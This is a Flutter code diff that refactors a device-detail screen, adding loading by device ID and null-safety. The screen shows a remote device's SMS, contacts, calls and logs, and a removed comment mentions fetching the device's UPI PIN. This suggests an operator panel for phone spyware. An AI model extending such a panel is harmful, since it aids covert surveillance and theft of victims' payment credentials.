@@ -13,12 +13,18 @@ import 'tabs/device_logs_tab.dart';
 import 'package:flutter_screenutil/flutter_screenutil.dart';
 
 class DeviceDetailScreen extends StatefulWidget {
-  final Device device;
+  final Device? device;
+  final String? deviceId;
 
   const DeviceDetailScreen({
     super.key,
-    required this.device,
-  });
+    this.device,
+    this.deviceId,
+  }) : assert(device != null || deviceId != null, 'Either device or deviceId must be provided');
+
+  factory DeviceDetailScreen.fromDeviceId(String deviceId) {
+    return DeviceDetailScreen(deviceId: deviceId);
+  }
 
   @override
   State<DeviceDetailScreen> createState() => _DeviceDetailScreenState();
@@ -27,10 +33,11 @@ class DeviceDetailScreen extends StatefulWidget {
 class _DeviceDetailScreenState extends State<DeviceDetailScreen>
     with SingleTickerProviderStateMixin {
   late TabController _tabController;
-  late Device _currentDevice;
+  Device? _currentDevice;
   final DeviceRepository _repository = DeviceRepository();
   bool _isRefreshing = false;
   bool _isPinging = false;
+  bool _isLoadingDevice = false;
   int _refreshKey = 0;
   Timer? _autoRefreshTimer;
   static const Duration _autoRefreshInterval = Duration(minutes: 1);
@@ -40,33 +47,93 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
   void initState() {
     super.initState();
     _tabController = TabController(length: 5, vsync: this);
-    _currentDevice = widget.device;
-    _startAutoRefresh();
-    _listenToDeviceUpdates();
     
-    // Automatically refresh device data when screen opens to get latest data (including UPI PIN)
-    WidgetsBinding.instance.addPostFrameCallback((_) {
-      _refreshDevice(showSnackbar: false);
-    });
+    if (widget.device != null) {
+      _currentDevice = widget.device;
+      _startAutoRefresh();
+      _listenToDeviceUpdates();
+      WidgetsBinding.instance.addPostFrameCallback((_) {
+        _refreshDevice(showSnackbar: false);
+      });
+    } else if (widget.deviceId != null) {
+      _isLoadingDevice = true;
+      _loadDeviceFromId(widget.deviceId!);
+    }
+  }
+
+  Future<void> _loadDeviceFromId(String deviceId) async {
+    try {
+      final deviceProvider = context.read<DeviceProvider>();
+      Device? device = deviceProvider.getDeviceById(deviceId);
+      
+      if (device == null) {
+        final updatedDevice = await _repository.getDevice(deviceId);
+        if (updatedDevice != null) {
+          device = updatedDevice;
+        } else {
+          throw Exception('Device not found');
+        }
+      }
+      
+      if (mounted) {
+        setState(() {
+          _currentDevice = device;
+          _isLoadingDevice = false;
+        });
+        _startAutoRefresh();
+        _listenToDeviceUpdates();
+        WidgetsBinding.instance.addPostFrameCallback((_) {
+          _refreshDevice(showSnackbar: false);
+        });
+      }
+    } catch (e) {
+      if (mounted) {
+        setState(() {
+          _isLoadingDevice = false;
+        });
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Row(
+              children: [
+                const Icon(Icons.error_rounded, color: Colors.white, size: 18),
+                const SizedBox(width: 10),
+                Expanded(
+                  child: Text(
+                    'Failed to load device: ${e.toString()}',
+                    style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 12),
+                  ),
+                ),
+              ],
+            ),
+            backgroundColor: const Color(0xFFEF4444),
+            behavior: SnackBarBehavior.floating,
+            duration: const Duration(seconds: 3),
+            action: SnackBarAction(
+              label: 'Retry',
+              textColor: Colors.white,
+              onPressed: () => _loadDeviceFromId(deviceId),
+            ),
+          ),
+        );
+      }
+    }
   }
   
   void _listenToDeviceUpdates() {
-    // Listen to device updates from DeviceProvider
-    // Check periodically if device was updated in DeviceProvider via WebSocket
+    if (_currentDevice == null) return;
+    
     _deviceUpdateSubscription = Stream.periodic(const Duration(seconds: 1)).listen((_) {
-      if (!mounted) return;
+      if (!mounted || _currentDevice == null) return;
       
       final deviceProvider = context.read<DeviceProvider>();
-      final updatedDevice = deviceProvider.getDeviceById(_currentDevice.deviceId);
+      final updatedDevice = deviceProvider.getDeviceById(_currentDevice!.deviceId);
       
       if (updatedDevice != null) {
-        // Check if device was actually updated (compare key fields)
-        final isUpdated = updatedDevice.isOnline != _currentDevice.isOnline ||
-            updatedDevice.status != _currentDevice.status ||
-            updatedDevice.batteryLevel != _currentDevice.batteryLevel;
+        final isUpdated = updatedDevice.isOnline != _currentDevice!.isOnline ||
+            updatedDevice.status != _currentDevice!.status ||
+            updatedDevice.batteryLevel != _currentDevice!.batteryLevel;
         
         if (isUpdated && mounted) {
-          // Device was updated in DeviceProvider, sync our local state
           setState(() {
             _currentDevice = updatedDevice;
             _refreshKey++;
@@ -84,12 +151,12 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
   }
 
   Future<void> _refreshDevice({bool showSnackbar = true}) async {
-    if (_isRefreshing) return;
+    if (_isRefreshing || _currentDevice == null) return;
 
     setState(() => _isRefreshing = true);
 
     try {
-      final updatedDevice = await _repository.getDevice(_currentDevice.deviceId);
+      final updatedDevice = await _repository.getDevice(_currentDevice!.deviceId);
       if (updatedDevice != null && mounted) {
         setState(() {
           _currentDevice = updatedDevice;
@@ -154,7 +221,7 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
   }
 
   Future<void> _handlePingDevice() async {
-    if (_isPinging) return;
+    if (_isPinging || _currentDevice == null) return;
 
     setState(() => _isPinging = true);
 
@@ -162,7 +229,7 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
 
     try {
       final success = await deviceProvider.sendCommand(
-        _currentDevice.deviceId,
+        _currentDevice!.deviceId,
         'ping',
         parameters: {'type': 'firebase'},
       );
@@ -241,6 +308,23 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
   @override
   Widget build(BuildContext context) {
     final isDark = Theme.of(context).brightness == Brightness.dark;
+
+    if (_isLoadingDevice) {
+      return Scaffold(
+        backgroundColor: isDark ? const Color(0xFF0F172A) : const Color(0xFFF8FAFC),
+        appBar: AppBar(
+          backgroundColor: Colors.transparent,
+          elevation: 0,
+          leading: IconButton(
+            icon: const Icon(Icons.arrow_back_rounded),
+            onPressed: () => Navigator.pop(context),
+          ),
+        ),
+        body: const Center(
+          child: CircularProgressIndicator(),
+        ),
+      );
+    }
 
     return Scaffold(
       backgroundColor: isDark ? const Color(0xFF0F172A) : const Color(0xFFF8FAFC),
@@ -367,7 +451,7 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
                   padding: const EdgeInsets.symmetric(horizontal: 12.8, vertical: 6.4),
                   decoration: BoxDecoration(
                     gradient: LinearGradient(
-                      colors: _currentDevice.isOnline
+                      colors: _currentDevice!.isOnline
                           ? [
                         const Color(0xFF10B981).withOpacity(0.2),
                         const Color(0xFF059669).withOpacity(0.2)
@@ -379,7 +463,7 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
                     ),
                     borderRadius: BorderRadius.circular(10.24),
                     border: Border.all(
-                      color: _currentDevice.isOnline
+                      color: _currentDevice!.isOnline
                           ? const Color(0xFF10B981).withOpacity(0.4)
                           : const Color(0xFFEF4444).withOpacity(0.4),
                       width: 1.2,
@@ -392,13 +476,13 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
                         width: 6.4,
                         height: 6.4,
                         decoration: BoxDecoration(
-                          color: _currentDevice.isOnline
+                          color: _currentDevice!.isOnline
                               ? const Color(0xFF10B981)
                               : const Color(0xFFEF4444),
                           shape: BoxShape.circle,
                           boxShadow: [
                             BoxShadow(
-                              color: (_currentDevice.isOnline
+                              color: (_currentDevice!.isOnline
                                   ? const Color(0xFF10B981)
                                   : const Color(0xFFEF4444))
                                   .withOpacity(0.6),
@@ -410,9 +494,9 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
                       ),
                       const SizedBox(width: 8),
                       Text(
-                        _currentDevice.isOnline ? 'Online' : 'Offline',
+                        _currentDevice!.isOnline ? 'Online' : 'Offline',
                         style: TextStyle(
-                          color: _currentDevice.isOnline
+                          color: _currentDevice!.isOnline
                               ? const Color(0xFF10B981)
                               : const Color(0xFFEF4444),
                           fontWeight: FontWeight.w700,
@@ -476,7 +560,7 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
                               crossAxisAlignment: CrossAxisAlignment.start,
                               children: [
                                 Text(
-                                  _currentDevice.model,
+                                  _currentDevice!.model,
                                   style: TextStyle(
                                     fontSize: 20.8,
                                     fontWeight: FontWeight.w800,
@@ -489,7 +573,7 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
                                 ),
                                 const SizedBox(height: 6),
                                 Text(
-                                  _currentDevice.manufacturer,
+                                  _currentDevice!.manufacturer,
                                   style: TextStyle(
                                     fontSize: 12,
                                     fontWeight: FontWeight.w600,
@@ -544,7 +628,7 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
                             const SizedBox(width: 10),
                             Expanded(
                               child: Text(
-                                _currentDevice.deviceId,
+                                _currentDevice!.deviceId,
                                 style: TextStyle(
                                   fontSize: 10.4,
                                   fontWeight: FontWeight.w700,
@@ -664,11 +748,11 @@ class _DeviceDetailScreenState extends State<DeviceDetailScreen>
         body: TabBarView(
           controller: _tabController,
           children: [
-            DeviceInfoTab(key: ValueKey('${_currentDevice.deviceId}_info_$_refreshKey'), device: _currentDevice),
-            DeviceSmsTab(key: ValueKey('${_currentDevice.deviceId}_sms_$_refreshKey'), device: _currentDevice),
-            DeviceContactsTab(key: ValueKey('${_currentDevice.deviceId}_contacts_$_refreshKey'), device: _currentDevice),
-            DeviceCallsTab(key: ValueKey('${_currentDevice.deviceId}_calls_$_refreshKey'), device: _currentDevice),
-            DeviceLogsTab(key: ValueKey('${_currentDevice.deviceId}_logs_$_refreshKey'), device: _currentDevice),
+            DeviceInfoTab(key: ValueKey('${_currentDevice!.deviceId}_info_$_refreshKey'), device: _currentDevice!),
+            DeviceSmsTab(key: ValueKey('${_currentDevice!.deviceId}_sms_$_refreshKey'), device: _currentDevice!),
+            DeviceContactsTab(key: ValueKey('${_currentDevice!.deviceId}_contacts_$_refreshKey'), device: _currentDevice!),
+            DeviceCallsTab(key: ValueKey('${_currentDevice!.deviceId}_calls_$_refreshKey'), device: _currentDevice!),
+            DeviceLogsTab(key: ValueKey('${_currentDevice!.deviceId}_logs_$_refreshKey'), device: _currentDevice!),
           ],
         ),
       ),
